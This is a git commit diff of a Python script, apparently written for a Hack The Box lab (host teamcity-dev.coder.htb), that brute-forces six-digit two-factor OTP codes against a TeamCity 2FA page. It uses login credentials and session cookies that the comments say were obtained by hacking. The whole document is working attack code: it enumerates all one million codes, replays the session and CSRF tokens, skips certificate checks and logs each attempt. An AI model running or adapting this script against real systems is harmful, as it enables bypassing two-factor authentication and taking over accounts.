b72cbcd66fc0ff5a3e40cc808d6655b035b87202
SaintMichae64 <71401539+SaintMichae64@users.noreply.github.com>
2023-07-08 19:19:19 -0500

    Update BruteForce6DigitOTP.py
    corrected code

--- BruteForce6DigitOTP.py
+++ BruteForce6DigitOTP.py
@@ -4,54 +4,63 @@
 import requests
 import warnings
 import time
+import logging
 from itertools import product
 from concurrent.futures import ThreadPoolExecutor
 
-# the user name and password were obtained by ethical hacking
-# the url, sessionid , and token values by veiwing the webpage, Inspect value
+# the user name and password values below are captured by other means (i.e. hacking). 
+# the TCSESSIONID and Tc-csrf-token are obtained by logging into the webiste with the user name and password, then right click on the 2fa webpage, click on Inspect(Q). The the values can be found under 'cookies' and 'debugger'.
 
 username = ""
 password = ""
-target_url = "https://xxx/2fa.html"
-tc_session_id = ""
-tc_csrf_token = ""
+target_url = "https://xxx.xxx.xxx/2fa.html"  # the url for the 2fa page
+initial_tc_session_id = ""
+initial_tc_csrf_token = ""
 
 found_otp = None
 attempts = 0
+is_otp_found = False
 
 # Suppress the warning about disabling certificate verification
 warnings.simplefilter("ignore", category=requests.urllib3.exceptions.InsecureRequestWarning)
 
-# Generate all possible 6-digit OTP combinations
-otp_combinations = product(range(10), repeat=6)
+# Set up logging configuration
+logging.basicConfig(
+    level=logging.INFO,
+    format="[%(asctime)s] %(message)s",
+    handlers=[
+        logging.FileHandler("BruteOTPLog.txt"),
+        logging.StreamHandler()
+    ]
+)
+
+# Log initial TCSESSIONID and tc-csrf-token values
+logging.info(f"Initial TCSESSIONID: {initial_tc_session_id}")
+logging.info(f"Initial tc-csrf-token: {initial_tc_csrf_token}")
 
 # Brute force the OTP using multithreading
-
 def attempt_login(otp_str):
-    global found_otp, attempts, tc_session_id, tc_csrf_token
+    global found_otp, attempts, is_otp_found, tc_session_id, tc_csrf_token
 
-# this requires no modification for user name and password, gets them from above
-    
     data = {
         "username": username,
         "password": password,
         "otp": otp_str
     }
-
-    # the below values, from line 40 through 57; were obtained using Burp
+# the below value can be obtained by using Burp Suite when the 2fa page is opening.
     
     headers = {
-        "Host": "",
+        "Host": "teamcity-dev.coder.htb",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0",
         "Accept": "application/json",
         "Accept-Language": "en-US,en;q=0.5",
         "Accept-Encoding": "gzip, deflate",
-        "Referer": "https://xxx.xxx/2fa.html",
+        "Referer": "https://xxx.xxx.xxx/2fa.html",
         "X-Requested-With": "XMLHttpRequest",
         "X-Teamcity-Client": "Web UI",
         "X-Tc-Csrf-Token": tc_csrf_token,
         "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
-        "Origin": "",
+        "Origin": "https://teamcity-dev.coder.htb",
         "Dnt": "1",
         "Sec-Fetch-Dest": "empty",
         "Sec-Fetch-Mode": "cors",
@@ -60,55 +69,58 @@ def attempt_login(otp_str):
         "Te": "trailers",
         "Cookie": f"TCSESSIONID={tc_session_id}; __test=1"
     }
-
-    # the below code does not require any modification for Burp values
-    
     response = requests.post(target_url, data=data, headers=headers, verify=False)
 
     attempts += 1
-    print(f"Attempted OTP: {otp_str}")
+    logging.info(f"Attempted OTP: {otp_str}")
 
     if response.status_code == 302:
         found_otp = otp_str
-        print(f"Successful login with OTP: {otp_str}")
+        is_otp_found = True
+        logging.info(f"Successful login with OTP: {otp_str}")
         return otp_str
-
-    # Check if the session data has changed
-    new_session_id = response.cookies.get("TCSESSIONID")
-    new_token = response.headers.get("X-Tc-Csrf-Token")
-
-    if new_session_id != tc_session_id:
-        tc_session_id = new_session_id
-        print(f"New TCSESSIONID detected: {tc_session_id}")
-
-    if new_token != tc_csrf_token:
-        tc_csrf_token = new_token
-        print(f"New tc-csrf-token detected: {tc_csrf_token}")
 
     return None
 
 start_time = time.time()
 
-with ThreadPoolExecutor() as executor:
-    # Submit login attempts for each OTP combination
-    futures = [executor.submit(attempt_login, "".join(map(str, otp_tuple))) for otp_tuple in otp_combinations]
+# Initialize TCSESSIONID and tc-csrf-token with the initial values
+tc_session_id = initial_tc_session_id
+tc_csrf_token = initial_tc_csrf_token
 
-    # Retrieve the result from the first successful attempt
-    for future in futures:
-        result = future.result()
+with ThreadPoolExecutor() as executor:
+    # Generate all possible 6-digit OTP combinations
+    otp_combinations = product(range(10), repeat=6)
+
+    # Submit login attempts for each OTP combination
+    for otp_tuple in otp_combinations:
+        if is_otp_found:
+            break
+
+        otp_str = "".join(map(str, otp_tuple))
+
+        # Check if TCSESSIONID or tc-csrf-token has changed
+        if tc_session_id != initial_tc_session_id or tc_csrf_token != initial_tc_csrf_token:
+            logging.info("TCSESSIONID or tc-csrf-token has changed.")
+            logging.info(f"Updated TCSESSIONID: {tc_session_id}")
+            logging.info(f"Updated tc-csrf-token: {tc_csrf_token}")
+            break
+
+        result = attempt_login(otp_str)
         if result:
             found_otp = result
+            is_otp_found = True
             break
 
 end_time = time.time()
 elapsed_time = end_time - start_time
 
 if found_otp:
-    print(f"\nLast successful OTP: {found_otp}")
+    logging.info(f"Last successful OTP: {found_otp}")
 else:
-    print("\nNo valid OTP found.")
+    logging.info("No valid OTP found.")
 
-print(f"\nTotal OTP combinations attempted: {attempts}")
-print(f"Total elapsed time: {elapsed_time:.2f} seconds")
+logging.info(f"Total OTP combinations attempted: {attempts}")
+logging.info(f"Total elapsed time: {elapsed_time:.2f} seconds")
 
-print("\nBrute force complete.")
+logging.info("Brute force complete.")
